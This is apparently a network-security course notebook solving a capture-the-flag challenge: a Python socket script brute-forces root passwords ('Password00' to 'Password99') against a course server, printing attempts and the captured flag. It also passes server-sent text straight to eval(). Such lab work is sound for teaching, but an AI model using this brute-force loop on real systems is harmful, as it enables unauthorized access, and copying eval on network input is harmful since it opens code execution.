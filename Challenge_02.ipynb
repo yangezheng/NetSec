{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Challenge 02\n",
    "\n",
    "#!/usr/bin/env python3\n",
    "import socket\n",
    "from base64 import b64encode, b64decode\n",
    "\n",
    "HOST = 'netsec.net.in.tum.de'   \n",
    "PORT = 20002                     \n",
    "\n",
    "\n",
    "def login(credentials):\n",
    "\n",
    "    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
    "\n",
    "    s.connect((HOST, PORT))\n",
    "    sf = s.makefile(\"rw\")  # we use a file abstraction for the sockets\n",
    "    print(\"Trying with: \", credentials)\n",
    "    sf.write(\"{}\\n\".format(credentials))\n",
    "    sf.flush()\n",
    "\n",
    "    challenge = sf.readline().rstrip('\\n')\n",
    "\n",
    "\n",
    "    response = eval(challenge)\n",
    "    sf.write(\"{}\\n\".format(response))\n",
    "    sf.flush()\n",
    "\n",
    "    data = sf.readline().rstrip('\\n')\n",
    "\n",
    "    data = sf.readline().rstrip('\\n')\n",
    "    if(len(data)!= 0):\n",
    "        print(\"From Server: received {} bytes\".format(len(data)))\n",
    "        print(data)\n",
    "        return True\n",
    "\n",
    "    sf.close()\n",
    "    s.close()\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying with:  root,Password00\n",
      "Trying with:  root,Password01\n",
      "Trying with:  root,Password02\n",
      "Trying with:  root,Password03\n",
      "Trying with:  root,Password04\n",
      "Trying with:  root,Password05\n",
      "Trying with:  root,Password06\n",
      "Trying with:  root,Password07\n",
      "Trying with:  root,Password08\n",
      "Trying with:  root,Password09\n",
      "From Server: received 42 bytes\n",
      "flag{d15d13037c9d2ead01f4497b02d5f25d286b}\n"
     ]
    }
   ],
   "source": [
    "from random import randrange\n",
    "\n",
    "while True:\n",
    "    credential = \"root,Password\"+str(randrange(100)).zfill(2)\n",
    "    if (login(credential)):\n",
    "        break"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "base",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
